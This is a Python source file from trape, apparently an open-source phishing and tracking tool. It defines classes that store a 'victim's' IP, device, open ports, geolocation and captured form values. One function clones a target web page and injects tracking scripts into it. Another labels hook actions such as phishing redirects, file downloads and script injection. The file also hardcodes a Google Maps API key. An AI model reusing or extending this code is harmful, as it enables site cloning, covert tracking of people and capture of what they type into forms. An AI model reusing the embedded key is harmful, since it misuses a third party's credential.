#!/usr/bin/env python
# -*- coding: utf-8 -*-
# **
#
#########
# trape #
#########
#
# trape depends of this file
# For full copyright information this visit: https://github.com/jofpin/trape
#
# Copyright 2018 by Jose Pino (@jofpin) / <jofpin@gmail.com>
# **
class victim(object):
    def __init__(self, vId, ip, device, browser, version, ports, cpu, date):
        self.vId = vId
        self.ip = ip
        self.device = device
        self.browser = browser
        self.version = version
        self.ports = ports
        self.cpu = cpu
        self.date = date


class victim_geo(object):
    def __init__(self, id, city, country_code, country_name, ip, latitude, longitude, metro_code, region_code, region_name, time_zone, zip_code, isp, ua, refer):
        self.id = id
        self.city = city
        self.country_code = country_code
        self.country_name = country_name
        self.ip = ip
        self.latitude = latitude
        self.longitude = longitude
        self.metro_code = metro_code
        self.region_code = region_code
        self.region_name = region_name
        self.time_zone = time_zone
        self.zip_code = zip_code
        self.isp = isp
        self.ua = ua
        self.refer = refer


class victim_request(object):
    def __init__(self, id, site, fid, name, value, sId):
        self.id = id
        self.site = site
        self.fid = fid
        self.name = name
        self.value = value
        self.sId = sId


def victim_headers2(ua):
    return {
        "User-Agent": str(ua),
        "Content-Type": "text/html; charset=utf-8",
        "Accept": "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.8",
        "Connection": "keep-alive",
        # Do Not Track (info here: https://www.w3.org/TR/tracking-dnt/)
        "DNT": "1",
        "Keep-Alive": "115",
    }


def victim_headers(ua):
    return [("User-Agent", ua),
            ("Content-Type", "text/html; charset=utf-8"),
            ("Accept", "text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.8"),
            ("Connection", "keep-alive"),
            # Do Not Track (info here: https://www.w3.org/TR/tracking-dnt/)
            ("DNT", "1"),
            ("Keep-Alive", "115")
            ]


def victim_inject_code(html, script='a', url_to_clone='', gMapsApiKey='AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM', IpInfoApiKey=''):
    url_to_clone = str(url_to_clone)
    html = html.replace('src="'.encode(), str('src="' + url_to_clone + '/').encode())
    html = html.replace("src='".encode(), str("src='" + url_to_clone + '/').encode())
    html = html.replace(str('src="' + url_to_clone + '/' + 'http').encode(), 'src="http'.encode())
    html = html.replace(str("src='" + url_to_clone + '/' + 'http').encode(), "src='http".encode())
    html = html.replace("href='".encode(), str("href='" + url_to_clone + '/').encode())
    html = html.replace('href="'.encode(), str('href="' + url_to_clone + '/').encode())
    html = html.replace(str('href="' + url_to_clone + '/' + 'http').encode(), 'href="http'.encode())
    html = html.replace(str("href='" + url_to_clone + '/' + 'http').encode(), "href='http".encode())
    html = html.replace(
        '</head>'.encode(), '<script type="text/javascript" src="/static/js/libs.min.js"></script></head>'.encode())
    html = html.replace('</head>'.encode(), str('<script type="text/javascript">window.gMapsApiKey="' + str(
        gMapsApiKey) + '"; window.IpInfoApiKey="' + str(IpInfoApiKey) + '";</script></head>').encode())
    html = html.replace(
        '</head>'.encode(), '<script type="text/javascript" src="/static/js/base.js"></script></head>'.encode())
    html = html.replace(
        '</head>'.encode(), '<script type="text/javascript" src="/static/js/custom.js"></script></head>'.encode())
    html = html.replace(
        '</head>'.encode(), str('<script type="text/javascript" src="/static/js/' + script + '.js"></script></head>').encode())
    return html


def attacks_hook_message(data):
    return {
        'network': 'Detected network ',
        'url': "Open url phishing ",
        'redirect': "Redirecting to ",
        'alert': "Sending alert ",
        'execute': "Downloading file ",
        'talk': "Sending voice message ",
        'jscode': "Sending Script ",
        'jsscript': "Injecting Script "
    }.get(data, False)
